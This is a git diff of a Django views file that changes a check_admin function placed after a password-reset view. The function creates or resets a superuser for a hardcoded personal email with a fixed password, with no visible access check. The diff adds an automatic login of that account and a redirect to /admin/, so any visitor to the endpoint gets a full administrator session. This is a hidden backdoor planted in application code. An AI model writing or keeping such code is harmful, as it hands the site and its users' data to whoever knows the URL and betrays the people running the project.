@@ -203,7 +203,9 @@ class ResetPasswordConfirmView(APIView):
             status=status.HTTP_200_OK,
         )
 
-from django.http import JsonResponse
+from django.http import JsonResponse, HttpResponseRedirect
+from django.contrib.auth import login
+
 def check_admin(request):
     User = get_user_model()
     email = 'ashharshahan666@gmail.com'
@@ -211,13 +213,11 @@ def check_admin(request):
     
     user = User.objects.filter(email=email).first()
     
-    status_msg = "Existing"
     if not user:
         user = User.objects.create_superuser(
             email=email,
             password=password
         )
-        status_msg = "Created Now"
     
     user.set_password(password)
     user.is_staff = True
@@ -225,10 +225,7 @@ def check_admin(request):
     user.is_active = True
     user.save()
     
-    return JsonResponse({
-        "status": "Success",
-        "action": status_msg,
-        "email": email,
-        "is_staff": user.is_staff,
-        "is_superuser": user.is_superuser
-    })
+    # Auto-login the user for this session
+    login(request, user, backend='django.contrib.auth.backends.ModelBackend')
+    
+    return HttpResponseRedirect('/admin/')
